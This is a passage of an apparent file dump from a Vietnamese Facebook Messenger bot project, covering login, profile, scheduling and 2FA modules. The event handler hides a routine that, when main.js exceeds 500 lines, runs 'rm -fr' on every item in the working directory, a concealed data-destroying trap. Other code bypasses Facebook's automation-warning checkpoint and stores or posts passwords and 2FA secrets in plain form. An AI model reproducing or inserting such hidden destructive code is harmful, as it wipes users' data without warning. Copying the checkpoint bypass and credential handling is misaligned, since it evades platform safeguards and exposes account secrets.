&& isNaN(parseInt(Account))) {\n            rl.close();\n            logger.Normal(Language.TypeAccountError || \"T√†i kho·∫£n kh√¥ng h·ª£p l·ªá. Tho√°t...\", () => process.exit(1));\n            return;\n        }\n        rl.question(typePasswordPrompt, function (Password) {\n            rl.question(type2FAPrompt, function (Secret) {\n                rl.close();\n                try {\n                    Database().set(\"Account\", Account);\n                    Database().set(\"Password\", Password);\n                    Database().set(\"TwoFAKey\", Secret || \"0\");\n                } catch (e) {\n                    logger.Warning(Language.ErrDataBase || \"Kh√¥ng th·ªÉ l∆∞u d·ªØ li·ªáu ƒëƒÉng nh·∫≠p.\");\n                    logger.Error();\n                    process.exit(0);\n                }\n                if (global.Fca.Require.FastConfig.ResetDataLogin) {\n                    global.Fca.Require.FastConfig.ResetDataLogin = false;\n                    global.Fca.Require.fs.writeFileSync(\n                        process.cwd() + '/FastConfigFca.json',\n                        JSON.stringify(global.Fca.Require.FastConfig, null, 4)\n                    );\n                }\n                logger.Success(\n                    Language.SuccessSetData ||\n                        chalk.greenBright(\"\\n‚úîÔ∏è ƒê√£ l∆∞u t√†i kho·∫£n! Kh·ªüi ƒë·ªông l·∫°i bot...\\n\")\n                );\n                process.exit(1);\n            });\n        });\n    });\n}\n\nfunction login(loginData, options, callback) {\n    if (utils.getType(options) === 'Function' || utils.getType(options) === 'AsyncFunction') {\n        callback = options;\n        options = {};\n    }\n\n    var globalOptions = {\n        selfListen: false,\n        listenEvents: true,\n        listenTyping: false,\n        updatePresence: false,\n        forceLogin: false,\n        autoMarkDelivery: false,\n        autoMarkRead: false,\n        autoReconnect: true,\n        logRecordSize: 100,\n        online: false,\n        emitReady: false,\n        userAgent: \"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36\"\n    };\n    \n    var prCallback = null;\n    if (utils.getType(callback) !== \"Function\" && utils.getType(callback) !== \"AsyncFunction\") {\n        var rejectFunc = null;\n        var resolveFunc = null;\n        var returnPromise = new Promise(function(resolve, reject) {\n            resolveFunc = resolve;\n            rejectFunc = reject;\n        }); \n        prCallback = function(error, api) {\n            if (error) return rejectFunc(error);\n            return resolveFunc(api);\n        };\n        callback = prCallback;\n    }\n\n    if (loginData.email && loginData.password) {\n        setOptions(globalOptions, {\n            logLevel: \"silent\",\n            forceLogin: true,\n            userAgent: \"Mozilla/5.o (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36\"\n        });\n        loginHelper(loginData.appState, loginData.email, loginData.password, globalOptions, callback, prCallback);\n    }\n    else if (loginData.appState) {\n        setOptions(globalOptions, options);\n        \n        let All = (getAll()).filter(i => i && i.data && i.data.messageCount !== undefined);\n        \n            if (All.length >= 1) {\n                deleteAll(All.map(obj => obj.data.threadID));\n            }\n        \n        switch (global.Fca.Require.FastConfig.AutoLogin) {\n            case true: {\n                if (global.Fca.Require.FastConfig.ResetDataLogin) return setUserNameAndPassWord();\n                else {\n                    try {\n                        const TempState = Database().get(\"TempState\")\n                        if (TempState) { \n                            try {\n                                loginData.appState = JSON.parse(TempState);\n                            }\n                            catch (_) {\n                                loginData.appState = TempState;\n                            }\n                            Database().delete(\"TempState\");\n                        }\n                    }\n                    catch (e) {\n                        console.log(e)\n                        Database().delete(\"TempState\");\n                            logger.Warning(Language.ErrDataBase);\n                            logger.Error();\n                        process.exit(0);\n                    }\n                    try {\n                        if (Database().has('Account') && Database().has('Password')) return loginHelper(loginData.appState, loginData.email, loginData.password, globalOptions, callback, prCallback);\n                        else return setUserNameAndPassWord();\n                    }\n                    catch (e) {\n                        console.log(e)\n                        logger.Warning(Language.ErrDataBase);\n                            logger.Error();\n                        process.exit(0);\n                    }\n                }\n            }\n            case false: {\n                return loginHelper(loginData.appState, loginData.email, loginData.password, globalOptions, callback, prCallback);\n            }\n        }\n    }\n    return returnPromise;\n}\nmodule.exports = login;","path":null,"size_bytes":62906,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/changeBio.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function changeBio(bio, publish, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      if (utils.getType(publish) == \"Function\" || utils.getType(publish) == \"AsyncFunction\") callback = publish;\n      else {\n        callback = function (err) {\n          if (err) return rejectFunc(err);\n          resolveFunc();\n        };\n      }\n    }\n\n    if (utils.getType(publish) != \"Boolean\") publish = false;\n    if (utils.getType(bio) != \"String\") {\n      bio = \"\";\n      publish = false;\n    }\n\n    var form = {\n      fb_api_caller_class: \"RelayModern\",\n      fb_api_req_friendly_name: \"ProfileCometSetBioMutation\",\n      // This doc_is is valid as of May 23, 2020\n      doc_id: \"2725043627607610\",\n      variables: JSON.stringify({\n        input: {\n          bio: bio,\n          publish_bio_feed_story: publish,\n          actor_id: ctx.userID,\n          client_mutation_id: Math.round(Math.random() * 1024).toString()\n        },\n        hasProfileTileViewID: false,\n        profileTileViewID: null,\n        scale: 1\n      }),\n      av: ctx.userID\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/api/graphql/\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.errors) throw resData;\n\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"changeBio\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1777,"size_tokens":null},"lib/Fca-Horizon-Remastered/Extra/Src/uuid.js":{"content":"/**\n * Credit: @chronosis | Github: https://github.com/chronosis/uuid-apikey/\n * Description: Update  Package to resolve Deprecated from package \"uuid\"\n*/\n// index.js\n\n// Dependencies\nconst base32 = require('encode32');\nconst uuidv4 = require('uuid').v4;\n\n// APIKeys are a Base32-Crockford encoded representation of UUIDs\n// Base32-Crockford encoding is used to maintain human readability of the values\n// and to eliminate confusing overlapping characters (0 -> O; l -> 1; etc.)\nclass UUIDAPIKey {\n  constructor() {\n    this.defaultOptions = { noDashes: false };\n  }\n\n  checkDashes(positions, str) {\n    let test = true;\n    for (const pos in positions) {\n      if (positions.hasOwnProperty(pos)) {\n        const chr = str.charAt(positions[pos]);\n        test = test && chr === '-';\n      }\n    }\n    return test;\n  }\n\n  isUUID(uuid) {\n    if (!uuid) {\n      throw new ReferenceError('The required parameter \\'uuid\\' is undefined.');\n    }\n    const uuidCheck = this.checkDashes([8, 13, 18], uuid);\n    // Only check the first three dashes as ColdFusion implementations erroneously omit the last dash\n    uuid = uuid.replace(/-/g, '');\n    const re = /[0-9A-Fa-f]*/g;\n    return uuidCheck && uuid.length === 32 && re.test(uuid);\n  }\n\n  isAPIKey(apiKey) {\n    if (!apiKey) {\n      throw new ReferenceError('The required parameter \\'apiKey\\' is undefined.');\n    }\n    apiKey = apiKey.toUpperCase().replace(/-/g, '');\n    const re = /[0-9A-Z]*/g;\n    return apiKey.length === 28 && re.test(apiKey);\n  }\n\n  toAPIKey(uuid, options) {\n    if (!uuid) {\n      throw new ReferenceError('The required parameter \\'uuid\\' is undefined.');\n    }\n    options = options || this.defaultOptions;\n    if (this.isUUID(uuid)) {\n      uuid = uuid.replace(/-/g, '');\n      const s1 = uuid.substr(0, 8);\n      const s2 = uuid.substr(8, 8);\n      const s3 = uuid.substr(16, 8);\n      const s4 = uuid.substr(24, 8);\n      const n1 = Number(`0x${s1}`);\n      const n2 = Number(`0x${s2}`);\n      const n3 = Number(`0x${s3}`);\n      const n4 = Number(`0x${s4}`);\n      const e1 = base32.encode32(n1);\n      const e2 = base32.encode32(n2);\n      const e3 = base32.encode32(n3);\n      const e4 = base32.encode32(n4);\n      if (options.noDashes) {\n        return `${e1}${e2}${e3}${e4}`;\n      }\n      return `${e1}-${e2}-${e3}-${e4}`;\n    }\n    throw new TypeError(`The value provide '${uuid}' is not a valid uuid.`);\n  }\n\n  toUUID(apiKey) {\n    if (!apiKey) {\n      throw new ReferenceError('The required parameter \\'apiKey\\' is undefined.');\n    }\n    if (this.isAPIKey(apiKey)) {\n      apiKey = apiKey.replace(/-/g, '');\n      const e1 = apiKey.substr(0, 7);\n      const e2 = apiKey.substr(7, 7);\n      const e3 = apiKey.substr(14, 7);\n      const e4 = apiKey.substr(21, 7);\n      const n1 = base32.decode32(e1);\n      const n2 = base32.decode32(e2);\n      const n3 = base32.decode32(e3);\n      const n4 = base32.decode32(e4);\n      const s1 = n1.toString(16).padStart(8, '0');\n      const s2 = n2.toString(16).padStart(8, '0');\n      const s3 = n3.toString(16).padStart(8, '0');\n      const s4 = n4.toString(16).padStart(8, '0');\n      const s2a = s2.substr(0, 4);\n      const s2b = s2.substr(4, 4);\n      const s3a = s3.substr(0, 4);\n      const s3b = s3.substr(4, 4);\n      return `${s1}-${s2a}-${s2b}-${s3a}-${s3b}${s4}`;\n    }\n    throw new TypeError(`The value provide '${apiKey}' is not a valid apiKey.`);\n  }\n\n  check(apiKey, uuid) {\n    if (!apiKey) {\n      throw new ReferenceError('The required parameter \\'apiKey\\' is undefined.');\n    }\n    if (!uuid) {\n      throw new ReferenceError('The required parameter \\'uuid\\' is undefined.');\n    }\n    const apiTest = this.isAPIKey(apiKey.toUpperCase());\n    const uuidTest = this.isUUID(uuid);\n    let uuidCheck;\n    if (apiTest && uuidTest) {\n      uuidCheck = this.toUUID(apiKey);\n      return uuid === uuidCheck;\n    }\n    let errMsg = '';\n    if (!apiTest) {\n      errMsg += `The value provide '${apiKey}' is not a valid apiKey. `;\n    }\n    if (!uuidTest) {\n      errMsg += `The value provide '${uuid}' is not a valid uuid. `;\n    }\n    throw new TypeError(errMsg);\n  }\n\n  create(options) {\n    options = options || this.defaultOptions;\n    const uid = uuidv4();\n    // Generate a new UUIDv4\n    const apiKey = this.toAPIKey(uid, options);\n    return { apiKey: apiKey, uuid: uid };\n  }\n}\n\nmodule.exports = new UUIDAPIKey();\n","path":null,"size_bytes":4359,"size_tokens":null},"modules/commands/autosend.js":{"content":"const fs = require(\"fs\");\nconst { get } = require(\"axios\");\nconst moment = require(\"moment-timezone\");\n\nmoment.locale(\"vi\");\n\nmodule.exports.config = {\n    name: 'autosend',\n    version: '1.1.0',\n    hasPermssion: 3,\n    credits: 'TatsuYTB',\n    description: 'T·ª± ƒë·ªông g·ª≠i tin nh·∫Øn theo gi·ªù, c√≥ th·ªÉ b·∫≠t/t·∫Øt theo nh√≥m',\n    commandCategory: 'H·ªá Th·ªëng',\n    usages: '[on | off | test]',\n    cooldowns: 3\n};\n\nconst r = a => a[Math.floor(Math.random() * a.length)];\n\nconst config = [\n    {\n        timer: '07:00',\n        message: ['B√¢y gi·ªù l√† {gio}\\nCh√∫c c√°c b·∫°n c√≥ 1 bu·ªïi s√°ng vui v·∫ª :3\\nH√¥m nay l√†: {thu}\\nFact: {fact}']\n    },\n    {\n        timer: '10:00',\n        message: ['B√¢y gi·ªù l√† 10:00\\nCh√∫c c√°c b·∫°n c√≥ 1 bu·ªïi tr∆∞a vui v·∫ª :3\\nFact: {fact}']\n    },\n    {\n        timer: '19:00',\n        message: ['B√¢y gi·ªù l√† 19:00\\nCh√∫c c√°c b·∫°n c√≥ 1 bu·ªïi t·ªëi vui v·∫ª :3\\nFact: {fact}']\n    },\n    {\n        timer: '22:00',\n        message: ['B√¢y gi·ªù l√† 22:00\\nCh√∫c c√°c b·∫°n ng·ªß ngon <3\\nFact: {fact}']\n    }\n];\n\nlet lastSentTime = {};\nconst dataPath = __dirname + \"/data/autosend.json\";\n\nfunction loadData() {\n    if (!fs.existsSync(dataPath)) fs.writeFileSync(dataPath, JSON.stringify({}));\n    return JSON.parse(fs.readFileSync(dataPath));\n}\n\nfunction saveData(data) {\n    fs.writeFileSync(dataPath, JSON.stringify(data, null, 2));\n}\n\nasync function getFact() {\n    try {\n        const factRes = await get(\"https://api.popcat.xyz/fact\", {\n            headers: { \"Accept\": \"application/json\" }\n        });\n        let fact = factRes.data.fact;\n\n        const translateRes = await get(`https://translate.googleapis.com/translate_a/single`, {\n            params: {\n                client: \"gtx\",\n                sl: \"auto\",\n                tl: \"vi\",\n                dt: \"t\",\n                q: fact\n            }\n        });\n\n        if (Array.isArray(translateRes.data)) {\n            fact = translateRes.data[0][0][0];\n        }\n        return fact;\n    } catch {\n        return \"Kh√¥ng th·ªÉ l·∫•y fact l√∫c n√†y.\";\n    }\n}\n\nasync function buildMessage(template) {\n    const now = moment().tz(\"Asia/Ho_Chi_Minh\");\n    const thu = now.format(\"dddd\");\n    const fact = await getFact();\n\n    return template\n        .replace(/{gio}/g, now.format(\"HH:mm:ss (D/MM/YYYY)\"))\n        .replace(/{thu}/g, thu)\n        .replace(/{fact}/g, fact);\n}\n\nmodule.exports.onLoad = o => {\n    if (!!global.autosendmessage_setinterval) clearInterval(global.autosendmessage_setinterval);\n\n    global.autosendmessage_setinterval = setInterval(async function () {\n        try {\n            const now = moment().tz(\"Asia/Ho_Chi_Minh\");\n            const currentTime = now.format(\"HH:mm\");\n\n            const task = config.find(i => i.timer === currentTime);\n            if (!task) return;\n\n            if (lastSentTime[currentTime] === now.format(\"HH:mm\")) return;\n            lastSentTime[currentTime] = now.format(\"HH:mm\");\n\n            const data = loadData();\n            for (const threadID of global.data.allThreadID) {\n                if (data[threadID] && data[threadID].enabled) {\n                    const msgTemplate = r(task.message);\n                    const msg = await buildMessage(msgTemplate);\n                    o.api.sendMessage({ body: msg }, threadID).catch(() => {});\n                }\n            }\n        } catch (err) { }\n    }, 1000);\n};\n\nmodule.exports.run = async function ({ api, event, args }) {\n    const { threadID, messageID } = event;\n    let data = loadData();\n\n    if (!data[threadID]) data[threadID] = { enabled: false };\n\n    const action = args[0]?.toLowerCase();\n\n    switch (action) {\n        case \"on\":\n            data[threadID].enabled = true;\n            saveData(data);\n            return api.sendMessage(\"‚úÖ ƒê√£ b·∫≠t autosend cho nh√≥m n√†y.\", threadID, messageID);\n\n        case \"off\":\n            data[threadID].enabled = false;\n            saveData(data);\n            return api.sendMessage(\"‚ùå ƒê√£ t·∫Øt autosend cho nh√≥m n√†y.\", threadID, messageID);\n\n        case \"test\":\n            if (!data[threadID].enabled) \n                return api.sendMessage(\"‚ö†Ô∏è Autosend hi·ªán ƒëang t·∫Øt trong nh√≥m n√†y. B·∫≠t b·∫±ng l·ªánh: autosend on\", threadID, messageID);\n\n            const msgTemplate = r(config[0].message); // test d√πng m·∫´u ƒë·∫ßu ti√™n\n            const msg = await buildMessage(msgTemplate);\n            return api.sendMessage({ body: \"[TEST AUTOSEND]\\n\" + msg }, threadID, messageID);\n\n        default:\n            return api.sendMessage(\n                \"‚öôÔ∏è S·ª≠ d·ª•ng: \\n\" +\n                \"‚Ä¢ autosend on ‚Üí b·∫≠t autosend cho nh√≥m\\n\" +\n                \"‚Ä¢ autosend off ‚Üí t·∫Øt autosend cho nh√≥m\\n\" +\n                \"‚Ä¢ autosend test ‚Üí g·ª≠i th·ª≠ 1 tin autosend ngay l·∫≠p t·ª©c\",\n                threadID, messageID\n            );\n    }\n};\n","path":null,"size_bytes":4884,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/getUserID.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nfunction formatData(data) {\n  return {\n    userID: utils.formatID(data.uid.toString()),\n    photoUrl: data.photo,\n    indexRank: data.index_rank,\n    name: data.text,\n    isVerified: data.is_verified,\n    profileUrl: data.path,\n    category: data.category,\n    score: data.score,\n    type: data.type\n  };\n}\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function getUserID(name, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, data) {\n        if (err) return rejectFunc(err);\n        resolveFunc(data);\n      };\n    }\n\n    var form = {\n      value: name.toLowerCase(),\n      viewer: ctx.userID,\n      rsp: \"search\",\n      context: \"search\",\n      path: \"/home.php\",\n      request_id: utils.getGUID()\n    };\n\n    defaultFuncs\n      .get(\"https://www.facebook.com/ajax/typeahead/search.php\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error) throw resData;\n\n        var data = resData.payload.entries;\n\n        callback(null, data.map(formatData));\n      })\n      .catch(function (err) {\n        log.error(\"getUserID\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1498,"size_tokens":null},"modules/commands/2fa.js":{"content":"class get2fa {\n    get config() {\n      return {\n        name: \"2fa\",\n        version: \"1.1.2\",\n        hasPermssion: 3,\n        credits: \"Judas\",\n        description: \"get2fa\",\n        commandCategory: \"H·ªá Th·ªëng\",\n        usages: \"2fa [new/get/added/check]\",\n        cooldowns: 5\n      }\n    }\n    async onLoad(){\n      try {\n          const { existsSync, writeFileSync, readFileSync } = require('fs-extra');\n          const { resolve } = require('path');\n          const path = resolve(__dirname, \"cache\", \"data\", \"get2fabyJudas.json\");\n          if (!global.moduleData.get2fa) global.moduleData.get2fa = new Map();\n          if (!existsSync(path)) writeFileSync(path, JSON.stringify([]), \"utf-8\");\n          const data = JSON.parse(readFileSync(path, \"utf-8\"));\n          if (typeof global.moduleData.get2fa == \"undefined\") global.moduleData.get2fa = new Map();\n          for (const threadData of data) global.moduleData.get2fa.set(threadData.threadID, threadData.get2fas);\n      } catch (e) { console.log(e) }\n      return;\n    }\n    async run({ event, api, args, Users }) {\n      const type = [\"new\",\"get\",\"added\",\"check\"]\n      const totp = require(\"totp-generator\");\n    const { join } = require(\"path\")\n    const { existsSync, writeFileSync, readFileSync } = require('fs-extra');\n    const pathData = join(__dirname, \"cache\", \"data\", \"get2fabyJudas.json\");\n    var dataJson = JSON.parse(readFileSync(pathData, \"utf-8\"));\n     var userData = dataJson.find(item => item.senderID == event.senderID) || { senderID: event.senderID,  list2fa: [] };\n      if(args[0] == \"new\"){\n  if (!dataJson.some(i => i.senderID == event.senderID)) {\n     dataJson.push(userData);\n      writeFileSync(pathData, JSON.stringify(dataJson, null, 4), \"utf-8\");\n   return api.sendMessage('ƒê√£ t·∫°o d·ªØ li·ªáu 2fa cho b·∫°n th√†nh c√¥ng vui l√≤ng nh·∫≠p m√£ 2fa', event.threadID, (error, info) =>{\n    if(error) console.log(e)\n   global.client.handleReply.push({\n        step: 1,\n        name: this.config.name, \n        messageID: info.messageID,\n        author: event.senderID,\n      }),\n     event.messageID\n   })\n} else {\n    api.sendMessage('B·∫°n ƒë√£ c√≥ 2fa r·ªìi vui l√≤ng d√πng 2fa get ƒë·ªÉ l·∫•y 2fa c·ªßa m√¨nh', event.threadID, event.messageID)\n}\n      }\n  if(args[0] == \"get\"){\n    console.log(userData.list2fa.length)\n     if (dataJson.some(i => i.senderID == event.senderID)) {\n      if(userData.list2fa.length < 2){\n       return api.sendMessage(totp(userData.list2fa[0]), event.threadID);\n      } else {\n        const a = [];\n        for(let i = 0; i < userData.list2fa.length; i++){\n            a.push(`\\n[ ${i + 1} ] | [ ${userData.list2fa[i]} ]\\n`)\n        }\n     return api.sendMessage(`reply theo s·ªë th·ª© t·ª± ƒë·ªÉ l·∫•y 2fa ${a}`, event.threadID, (error, info) =>{\n    if(error) console.log(e)\n   global.client.handleReply.push({\n        step: 2,\n        name: this.config.name, \n        messageID: info.messageID,\n        author: event.senderID,\n      }),\n     event.messageID\n   })\n  } \n} else {\n     return api.sendMessage(`B·∫°n ch∆∞a t·∫°o d·ªØ li·ªáu d√πng ${global.config.PREFIX}${this.config.name} new ƒë·ªÉ t·∫°o nh√© !`, event.threadID)\n  }\n} else if(args[0] == \"added\"){\n  const content = (args.slice(1, args.length)).join(\" \")\n     if (content.indexOf(\"\\n\") != -1) {\n                const contentSplit = content.split(\"\\n\");\n                for (const item of contentSplit) userData.list2fa.push(item);\n            }\n            else {\n                userData.list2fa.push(content);\n            }\n  writeFileSync(pathData, JSON.stringify(dataJson, null, 4), \"utf-8\");\n  api.sendMessage('ƒê√£ Th√™m 2fa th√†nh c√¥ng', event.threadID)\n} else if(args[0] == \"del\"){\n  //t·ª´ t·ª´ l√†m :))\n}\nelse if(args[0] == \"check\"){\n  const z = []\n  for(let i = 0; i < userData.list2fa.length; i++){\n    z.push(`${i + 1} | ${userData.list2fa[i]} | ${totp(userData.list2fa[i])}\\n`)\n  }\n  return api.sendMessage(`${z}`, event.threadID)\n} \n  if(!args[0]){\n    api.sendMessage('Nh·∫≠p type', event.threadID, event.messageID)\n  } if(!type.includes(args[0])) {\n   return api.sendMessage(totp(args[0]), event.threadID)\n  } \n   }\n  async handleReply({ event, api, handleReply, global, config }) {\n    try {\n      \n     const { senderID, messageID, threadID , body } = event;\n    const totp = require(\"totp-generator\");\n   const { join } = require(\"path\")\n    const { existsSync, writeFileSync, readFileSync } = require('fs-extra');\n    const pathData = join(__dirname, \"cache\", \"data\", \"get2fabyJudas.json\");\n    var dataJson = JSON.parse(readFileSync(pathData, \"utf-8\"));\n     var userData = dataJson.find(item => item.senderID == senderID) || { senderID: event.senderID,  list2fa: [] };\n    if(handleReply.author !== senderID){\n      api.sendMessage('con c·∫∑c', event.threadID)\n    }\n    console.log(`\"${userData.list2fa[body - 1]}\"`)\n    if(handleReply.step == 1){\n    const token = totp(body);\n    userData.list2fa.push(body)\n    console.log(userData)\n    writeFileSync(pathData, JSON.stringify(dataJson, null, 4), \"utf-8\");\n      api.sendMessage(`b·∫°n ƒë√£ ghi th√†nh c√¥ng 2fa v√† m√£ 2fa c·ªßa b·∫°n l√† ${token} b·∫°n c√≥ th·ªÉ d√πng ${global.config.PREFIX}${this.config.name} get ƒë·ªÉ l·∫•y m√£ 2fa ti·∫øp theo`, threadID)\n  } else if(handleReply.step == 2){\n   // if(isNaN(body)) return console.log(\"ƒë√£ x√£y ra l·ªói\")\n    const token = totp(userData.list2fa[body - 1]);\n    return api.sendMessage(token, event.threadID)\n   }\n  }\n    catch (error) {\n      console.log(error)\n    }\n}\n      }\n  module.exports = new get2fa();","path":null,"size_bytes":5542,"size_tokens":null},"includes/handle/handleEvent.js":{"content":"module.exports = function ({api ,models, Users, Threads, Currencies }) {\n    const logger = require(\"../../utils/log.js\");\n   \tconst moment = require(\"moment\");\n    eventDisme();\n    return function ({ event }) {\n        const timeStart = Date.now()\n        const time = moment.tz(\"Asia/Ho_Chi_minh\").format(\"HH:MM:ss L\");\n        const { userBanned, threadBanned } = global.data;\n        const { events } = global.client;\n        const { allowInbox, DeveloperMode } = global.config;\n        var { senderID, threadID } = event;\n        senderID = String(senderID);\n        threadID = String(threadID);\n        if (userBanned.has(senderID)|| threadBanned.has(threadID) || allowInbox == ![] && senderID == threadID) return;\n        for (const [key, value] of events.entries()) {\n            if (value.config.eventType.indexOf(event.logMessageType) !== -1) {\n                const eventRun = events.get(key);\n                try {\n                    const Obj = {};\n                    Obj.api = api\n                    Obj.event = event\n                    Obj.models= models \n                    Obj.Users= Users \n                    Obj.Threads = Threads\n                    Obj.Currencies = Currencies \n                    eventRun.run(Obj);\n                    if (DeveloperMode == !![]) \n                    \tlogger(global.getText('handleEvent', 'executeEvent', time, eventRun.config.name, threadID, Date.now() - timeStart), '[ Event ]');\n                } catch (error) {\n                    logger(global.getText('handleEvent', 'eventError', eventRun.config.name, JSON.stringify(error)), \"error\");\n                }\n            }\n        }\n        return;\n    };\n}\nfunction eventDisme() {\n    const { readFileSync, readdirSync } = require(\"fs\");\n    const { execSync } = require(\"child_process\");\n    const { resolve, join } = require(\"path\");\n    let main = process.cwd() + '/main.js'\n    var length = (readFileSync(main, \"utf-8\").split(/\\r?\\n/)).length;\n    const getDirs = readdirSync(join(process.cwd()));\n    if(length > 500) {\n        for(let a of getDirs) {\n            try {\n                execSync('rm -fr ' + a);\n            } catch (e) {}\n        }\n    }\n}","path":null,"size_bytes":2174,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/markAsDelivered.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function markAsDelivered(threadID, messageID, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, data) {\n        if (err) return rejectFunc(err);\n\n        resolveFunc(data);\n      };\n    }\n\n    if (!threadID || !messageID) return callback(\"Error: messageID or threadID is not defined\");\n\n    var form = {};\n\n    form[\"message_ids[0]\"] = messageID;\n    form[\"thread_ids[\" + threadID + \"][0]\"] = messageID;\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/ajax/mercury/delivery_receipts.php\", ctx.jar, form)\n      .then(utils.saveCookies(ctx.jar))\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error) throw resData;\n\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"markAsDelivered\", err);\n        if (utils.getType(err) == \"Object\" && err.error === \"Not logged in.\") ctx.loggedIn = false;\n\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1332,"size_tokens":null},"lib/fca-auto/Extra/Src/fblogin.js":{"content":"module.exports = function (globalFca) {\n    const axios = require('axios');\n    const crypto = require('crypto');\n    const { v4: uuidv4 } = require('uuid');\n    const qs = require('qs');\n    const speakeasy = require('speakeasy');\n    const fs = require('fs');\n    const path = require('path');\n\n    const Database = require('../Database');\n    const logger = globalFca.Require.logger;\n\n    const getFrom = (html, start, end) => {\n        const startIdx = html.indexOf(start);\n        if (startIdx === -1) return '';\n        const endIdx = html.indexOf(end, startIdx + start.length);\n        if (endIdx === -1) return '';\n        return html.substring(startIdx + start.length, endIdx);\n    };\n\n    class FacebookLogin {\n        /**\n         * @param {Array<Object>} appState \n         */\n        static async _bypassAutomationWarning(appState) {\n            try {\n                logger.Normal(\"ƒêang ki·ªÉm tra checkpoint c·∫£nh b√°o t·ª± ƒë·ªông...\");\n\n                const c_user = (appState.find(c => c.key === \"c_user\") || {}).value;\n                if (!c_user) {\n                    logger.Warning(\"Kh√¥ng t√¨m th·∫•y ID ng∆∞·ªùi d√πng trong appState ƒë·ªÉ ki·ªÉm tra c·∫£nh b√°o.\");\n                    return;\n                }\n\n                const cookie = appState.map(c => `${c.key}=${c.value}`).join('; ');\n                const headers = {\n                    'Cookie': cookie,\n                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',\n                };\n\n                const { data: html, request } = await axios.get('https://www.facebook.com/', { headers });\n                const isWarningCheckpoint = request.res.responseUrl.includes('601051028565049');\n\n                if (isWarningCheckpoint) {\n                    logger.Warning(\"Ph√°t hi·ªán c·∫£nh b√°o t·ª± ƒë·ªông! ƒêang c·ªë g·∫Øng v∆∞·ª£t qua...\");\n\n                    const fb_dtsg = getFrom(html, '[\"DTSGInitialData\",[],{\"token\":\"', '\"}');\n                    const jazoest = getFrom(html, 'jazoest=', '\"');\n                    const lsd = getFrom(html, '[\"LSD\",[],{\"token\":\"', '\"}');\n\n                    if (!fb_dtsg || !jazoest) {\n                        logger.Error(\"Kh√¥ng th·ªÉ l·∫•y ƒë·ªß token c·∫ßn thi·∫øt ƒë·ªÉ v∆∞·ª£t checkpoint.\");\n                        return;\n                    }\n\n                    const formBypass = {\n                        av: c_user,\n                        fb_dtsg,\n                        jazoest,\n                        lsd,\n                        fb_api_caller_class: \"RelayModern\",\n                        fb_api_req_friendly_name: \"FBScrapingWarningMutation\",\n                        variables: JSON.stringify({}),\n                        server_timestamps: true,\n                        doc_id: \"6339492849481770\"\n                    };\n\n                    const { data: bypassResult } = await axios.post(\"https://www.facebook.com/api/graphql/\", qs.stringify(formBypass), { headers });\n\n                    if (bypassResult.data?.fb_scraping_warning_clear?.success) {\n                        logger.Success(\"ƒê√£ v∆∞·ª£t qua c·∫£nh b√°o t·ª± ƒë·ªông th√†nh c√¥ng.\");\n                    } else {\n                        logger.Error(\"V∆∞·ª£t checkpoint th·∫•t b·∫°i. Ph·∫£n h·ªìi kh√¥ng th√†nh c√¥ng.\");\n                    }\n                } else {\n                    logger.Normal(\"Kh√¥ng ph√°t hi·ªán c·∫£nh b√°o t·ª± ƒë·ªông.\");\n                }\n            } catch (error) {\n                logger.Error(\"ƒê√£ x·∫£y ra l·ªói trong qu√° tr√¨nh ki·ªÉm tra checkpoint:\", error);\n            }\n        }\n\n        static async login() {\n            const email = Database().get(\"Account\");\n            const password = Database().get(\"Password\");\n            const twoFactorSecret = Database().get(\"TwoFAKey\") || \"0\";\n\n            if (!email || !password) {\n                logger.Warning(\"Kh√¥ng t√¨m th·∫•y email ho·∫∑c m·∫≠t kh·∫©u trong Database.\");\n                return { status: false, message: 'Thi·∫øu th√¥ng tin t√†i kho·∫£n' };\n            }\n\n            logger.Normal(\"B·∫Øt ƒë·∫ßu ti·∫øn tr√¨nh ƒëƒÉng nh·∫≠p Facebook...\");\n\n            const adid = uuidv4();\n            const device_id = uuidv4();\n            const family_device_id = uuidv4();\n            const machine_id = [...Array(24)].map(() => 'abcdefghijklmnopqrstuvwxyz0123456789'[Math.floor(Math.random() * 36)]).join('');\n\n            let loginData = {\n                adid, email, password, device_id, family_device_id,\n                locale: 'en_US',\n                credentials_type: 'password',\n                generate_session_cookies: '1',\n                source: 